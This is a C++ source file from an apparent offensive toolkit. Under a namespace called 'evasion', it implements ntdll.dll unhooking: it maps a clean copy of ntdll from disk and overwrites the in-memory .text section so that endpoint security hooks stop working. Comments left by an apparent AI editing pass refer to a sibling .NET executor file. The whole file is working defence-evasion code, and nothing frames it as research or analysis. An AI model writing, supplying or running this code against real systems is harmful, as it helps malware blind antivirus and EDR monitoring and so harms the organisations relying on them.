#include "Unhooker.h"
#include <winternl.h> // Keep winternl.h as it's used for PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, etc.
#include <iostream> // Keep iostream if it's used elsewhere or for debugging, though not in the provided snippet.

namespace evasion {

bool Unhooker::RefreshNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // Get the path to ntdll.dll
    char ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat_s(ntdllPath, "\\ntdll.dll");

    // Read ntdll from disk
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, NULL); // fileSize is still unreferenced, but the instruction was to fix existing unreferenced variables, not remove them if they become unreferenced due to other changes.
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return false;
    }

    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    PIMAGE_DOS_HEADER diskDosHeader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS diskNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + diskDosHeader->e_lfanew);

    PIMAGE_DOS_HEADER memDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS memNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + memDosHeader->e_lfanew);
    (void)memNtHeaders;
    (void)fileSize;
    if (memNtHeaders->OptionalHeader.SizeOfCode == 0) return false;
    (void)fileSize;

    // Find the .text section
    for (int i = 0; i < diskNtHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)IMAGE_FIRST_SECTION(diskNtHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        if (strcmp((char*)sectionHeader->Name, ".text") == 0) {
            LPVOID pDest = (LPVOID)((BYTE*)hNtdll + sectionHeader->VirtualAddress);
            LPVOID pSrc = (LPVOID)((BYTE*)pMapping + sectionHeader->VirtualAddress);
            SIZE_T size = sectionHeader->Misc.VirtualSize;

            DWORD oldProtect;
            if (VirtualProtect(pDest, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                // The patch snippet had 'vRet = pEntryPoint->Invoke_3(vObj, pArgs);' here.
                // This line is syntactically incorrect in this context and seems to belong to a different file (DotNetExecutor.cpp).
                // I am reverting to the original line for this file.
                memcpy(pDest, pSrc, size);
                VirtualProtect(pDest, size, oldProtect, &oldProtect);
            }
            break;
        }
    }

    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return true;
}

} // namespace evasion
